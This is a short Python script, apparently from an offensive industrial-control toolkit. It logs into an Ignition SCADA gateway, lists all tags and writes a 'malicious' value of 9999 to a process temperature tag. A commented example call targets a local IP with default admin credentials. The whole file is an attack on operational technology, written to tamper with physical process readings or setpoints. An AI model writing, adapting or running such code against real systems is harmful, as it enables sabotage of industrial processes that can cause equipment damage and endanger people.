def ignition_sqltag_manipulation(gateway_url, username, password):
    """
    Manipulate Ignition SQL Tags database
    Ignition stores tags in internal SQL database
    """
    import requests
    from requests.auth import HTTPBasicAuth

    # Authenticate
    auth = HTTPBasicAuth(username, password)

    # Ignition Gateway API endpoint
    api_url = f"{gateway_url}/system/gateway/data/tags"

    # Read all tags
    response = requests.get(api_url, auth=auth)
    tags = response.json()

    print(f"[*] Found {len(tags)} tags")

    # Modify tag value
    tag_path = "Provider/Tags/Process/Temperature"
    malicious_value = 9999

    payload = {
        "tagPath": tag_path,
        "value": malicious_value
    }

    response = requests.post(f"{api_url}/write", json=payload, auth=auth)

    if response.status_code == 200:
        print(f"[+] Tag {tag_path} set to {malicious_value}")
    else:
        print(f"[-] Write failed: {response.text}")

# ignition_sqltag_manipulation('http://192.168.1.100:8088', 'admin', 'password')
